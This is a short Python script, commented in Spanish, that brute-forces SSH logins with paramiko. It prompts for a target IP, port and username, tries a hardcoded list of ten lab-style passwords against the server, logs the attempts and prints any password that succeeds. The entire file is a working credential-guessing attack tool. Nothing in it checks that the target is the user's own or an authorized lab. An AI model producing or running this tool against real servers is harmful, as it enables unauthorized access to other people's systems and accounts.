import sys
import time
import logging

try:
    import paramiko
except ImportError:
    print("Paramiko no está instalado. Instala con: pip install paramiko")
    sys.exit(1)

logging.basicConfig(
    filename="ssh_brute_log.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# -- Lista de contraseñas provista por el usuario (una por línea)
PASSWORDS = [
    "Test123!",
    "Password123!",
    "AzureTest2025!",
    "LabPass01!",
    "MySecureTest!",
    "DevUser2025!",
    "TryConnection!",
    "SamplePass22!",
    "FakeLogin2025!",
    "BruteForceDemo!",
]


def try_password(host, port, username, password, timeout=5):
    #No registra la contraseña en texto claro en el log (por privacidad).
    logging.info(f"Intento de autenticacion: {username}@{host}:{port} (len={len(password)})")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # connect lanza AuthenticationException si la contraseña es incorrecta
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        logging.info("ACCESO EXITOSO")
        return True
    except paramiko.AuthenticationException:
        # autenticación fallida: contraseña incorrecta
        logging.info("Autenticacion fallida")
        return False
    except Exception as e:
        # errores de red u otros
        logging.info(f"Error de conexión: {e}")
        return False
    finally:
        try:
            client.close()
        except Exception:
            pass


def interactive_main():
    print("\nBrute-force SSH\n")

    host = input("IP objetivo: ").strip()
    # permitir que el usuario presione Enter para usar el puerto por defecto 22
    port_input = input("Puerto (22): ").strip()
    try:
        port = int(port_input) if port_input else 22
    except ValueError:
        print("Puerto inválido, usando 22")
        port = 22

    username = input("Usuario: ").strip()

    # Confirmación breve antes de comenzar
    print(f"\nComenzando pruebas contra {host}:{port} como usuario '{username}'")
    print("Lista de contraseñas: ", len(PASSWORDS), "items")

    try:
        for password in PASSWORDS:
            print(f"Probando: {password}")
            ok = try_password(host, port, username, password)
            if ok:
                print(f"Contraseña encontrada: {password}")
                break
            # pequeño retardo para evitar sobrecarga
            time.sleep(0.5)
        else:
            print("Ninguna contraseña coincidió")
    except KeyboardInterrupt:
        print("\nInterrumpido por el usuario")


if __name__ == "__main__":
    interactive_main()

